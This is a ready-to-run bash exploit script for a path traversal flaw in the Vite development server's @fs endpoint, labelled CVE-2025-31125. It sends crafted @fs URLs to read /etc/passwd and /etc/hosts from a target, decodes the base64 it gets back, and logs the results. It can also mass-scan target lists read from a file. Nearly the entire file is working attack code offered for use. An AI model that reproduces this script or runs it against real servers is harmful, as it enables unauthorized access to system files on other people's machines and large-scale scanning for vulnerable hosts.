#!/bin/bash

# Banner
BANNER=$'\e[36m============================================================
          Vite Development Server Path Traversal Exploit
                  CVE-2025-31125
          Created by RiverHunter
============================================================\e[0m
\e[33mDescription:\e[0m
Path traversal vulnerability in Vite development server\'s @fs endpoint allows 
attackers to access files outside the intended directory. When exposed to the 
network, attackers can exploit this via crafted URLs to access sensitive system files.
'

# Function to decode base64 (requires base64 utility)
decode_base64() {
  # Extract the pure base64 string using grep with PCRE
  # Looks for 'base64,' possibly followed by spaces, then captures valid base64 characters.
  local b64_candidate
  b64_candidate=$(echo "$1" | grep -oP 'base64,\s*\K[A-Za-z0-9+/=]+')

  if [[ -n "$b64_candidate" ]]; then
    # Decode using base64 utility, suppress stderr in case of invalid input
    local decoded
    decoded=$(echo "$b64_candidate" | base64 -d 2>/dev/null)
    # Check if decoding was successful and produced non-empty output
    if [[ $? -eq 0 && -n "$decoded" ]]; then
      echo "$decoded"
    else
      return 1 # Indicate failure: bad base64 string or empty result
    fi
  else
    return 1 # Indicate failure
  fi
}

# Function to save output to a file
save_output() {
  local data="$1"
  local output_file="$2"
  
  if [[ -n "$output_file" ]]; then
    echo "$data" >> "$output_file"
    if [[ $? -eq 0 ]]; then
      echo -e "\e[32m[+] Saved output to $output_file\e[0m"
    else
      echo -e "\e[31m[-] Error saving to $output_file\e[0m"
    fi
  fi
}

# Function to exploit the Vite vulnerability
exploit_vite() {
  local target_base_url="$1"
  local passwd_path_suffix="$2"
  local hosts_path_suffix="$3"
  local output_file="$4"

  # --- Try /etc/passwd ---
  local full_passwd_url="${target_base_url}${passwd_path_suffix}"
  local header_temp_file_passwd
  header_temp_file_passwd=$(mktemp)
  temp_files+=("$header_temp_file_passwd")
  local body_temp_file_passwd
  body_temp_file_passwd=$(mktemp)
  temp_files+=("$body_temp_file_passwd")

  local status_code_passwd response_passwd content_type_passwd
  status_code_passwd=$(curl -s -k -w "%{http_code}" "$full_passwd_url" -o "$body_temp_file_passwd" -D "$header_temp_file_passwd")
  response_passwd=$(<"$body_temp_file_passwd")
  content_type_passwd=$(grep -i "^Content-Type:" "$header_temp_file_passwd" | sed -E 's/^[Cc]ontent-[Tt]ype: *//I; s/\r$//')

  if [[ "$status_code_passwd" -eq 200 ]] && \
     [[ "$response_passwd" == *"data:application/octet-stream"* ]] && \
     [[ "$response_passwd" == *"base64"* ]] && \
     [[ "$content_type_passwd" == *"text/javascript"* ]]; then
    
    local decoded_data_passwd
    decoded_data_passwd=$(decode_base64 "$response_passwd")
    if [[ -n "$decoded_data_passwd" ]]; then
      local output_msg_passwd
      output_msg_passwd=$"\e[32m[+] Vulnerable path: $passwd_path_suffix\n[+] Decoded data (/etc/passwd):\n$decoded_data_passwd\n\e[0m"
      echo -e "$output_msg_passwd"
      save_output "$output_msg_passwd" "$output_file"

      # --- If passwd is found, try /etc/hosts ---
      local full_hosts_url="${target_base_url}${hosts_path_suffix}"
      local header_temp_file_hosts
      header_temp_file_hosts=$(mktemp)
      temp_files+=("$header_temp_file_hosts")
      local body_temp_file_hosts
      body_temp_file_hosts=$(mktemp)
      temp_files+=("$body_temp_file_hosts")

      local status_code_hosts response_hosts content_type_hosts
      status_code_hosts=$(curl -s -k -w "%{http_code}" "$full_hosts_url" -o "$body_temp_file_hosts" -D "$header_temp_file_hosts")
      response_hosts=$(<"$body_temp_file_hosts")
      content_type_hosts=$(grep -i "^Content-Type:" "$header_temp_file_hosts" | sed -E 's/^[Cc]ontent-[Tt]ype: *//I; s/\r$//')

      if [[ "$status_code_hosts" -eq 200 ]] && \
         [[ "$response_hosts" == *"data:application/octet-stream"* ]] && \
         [[ "$response_hosts" == *"base64"* ]] && \
         [[ "$content_type_hosts" == *"text/javascript"* ]]; then
        
        local decoded_data_hosts
        decoded_data_hosts=$(decode_base64 "$response_hosts")
        if [[ -n "$decoded_data_hosts" ]]; then
          local output_msg_hosts
          output_msg_hosts=$"\e[32m[+] Vulnerable path: $hosts_path_suffix\n[+] Decoded data (/etc/hosts):\n$decoded_data_hosts\n\e[0m"
          echo -e "$output_msg_hosts"
          save_output "$output_msg_hosts" "$output_file"
        else
          echo -e "\e[31m[-] No valid base64 data found for $hosts_path_suffix (Status: $status_code_hosts, Content-Type: '$content_type_hosts')\e[0m\n"
        fi
      else
        echo -e "\e[31m[-] Target not vulnerable for $hosts_path_suffix (Status: $status_code_hosts, Content-Type: '$content_type_hosts')\e[0m\n"
      fi
    else
      echo -e "\e[31m[-] No valid base64 data found for $passwd_path_suffix (Status: $status_code_passwd, Content-Type: '$content_type_passwd')\e[0m\n"
    fi
  else
    # No need to print anything here, like the python script
    :
  fi
}

# Function to load URLs from a file
load_urls_from_file() {
  local file_path="$1"
  
  if [[ -f "$file_path" ]]; then
    while IFS= read -r line; do
      if [[ -n "$line" ]]; then #checks if the line is not empty
        echo "$line"
      fi
    done < "$file_path"
  else
    echo -e "\e[31m[-] Error reading file $file_path\e[0m" >&2
    return 1
  fi
}

# Main function
main() {
  local url
  local file
  local output

  # Setup for temporary file cleanup
  temp_files=()
  cleanup() {
    for tmp_file in "${temp_files[@]}"; do
        rm -f "$tmp_file"
    done
  }
  trap cleanup EXIT
  
  # Use getopts for argument parsing
  while getopts "u:f:o:" opt; do
    case "$opt" in
      u) url="$OPTARG" ;;
      f) file="$OPTARG" ;;
      o) output="$OPTARG" ;;
      *)
        usage # Call usage function for invalid options
        exit 1
        ;;
    esac
  done
  shift $((OPTIND -1)) # This line is correct, keep it.

  # Validate arguments
  if [[ -z "$url" && -z "$file" ]]; then
    echo -e "\e[31m[-] Error: Either -u or -f must be provided\e[0m"
    usage
    exit 1
  fi

  # Print banner
  echo -e "$BANNER"

  # Paths to check
  local passwd_path="/@fs/etc/passwd?import&?inline=1.wasm?init"
  local hosts_path="/@fs/etc/hosts?import&?inline=1.wasm?init"
  
  # Handle single URL
  if [[ -n "$url" ]]; then
    echo -e "\e[36m[*] Scanning single URL: $url\e[0m"
    exploit_vite "$url" "$passwd_path" "$hosts_path" "$output"
  fi

  # Handle URL file
  if [[ -n "$file" ]]; then
    echo -e "\e[33m[!] Alert: Scanning multiple URLs from $file. Only vulnerable URLs with data will be shown.\e[0m"
    urls=($(load_urls_from_file "$file"))
    if [[ ${#urls[@]} -eq 0 ]]; then
      echo -e "\e[31m[-] No valid URLs found in $file. Exiting.\e[0m"
      exit 1
    fi
    for u in "${urls[@]}"; do
      echo -e "\e[36m[*] Scanning URL: $u\e[0m"
      exploit_vite "$u" "$passwd_path" "$hosts_path" "$output"
    done
  fi
}

# Usage function
usage() {
  echo "Usage: $0 [-u <url>] [-f <file>] [-o <output>]
  -u <url>    Target URL of the Vite server (e.g., http://target.com)
  -f <file>   File containing URLs to scan (one per line)
  -o <output> Output file to save results

Examples:
  Scan a single URL: $0 -u http://target.com
  Scan multiple URLs from a file: $0 -f urls.txt -o output.txt
  Save results: $0 -u http://target.com -o output.txt

Note:
  When using -f to scan multiple URLs, only vulnerable URLs with decoded data will be shown.
  Use -u for a single URL to see detailed data for /etc/passwd and /etc/hosts.
  "
}

# Run the main function
main "$@"
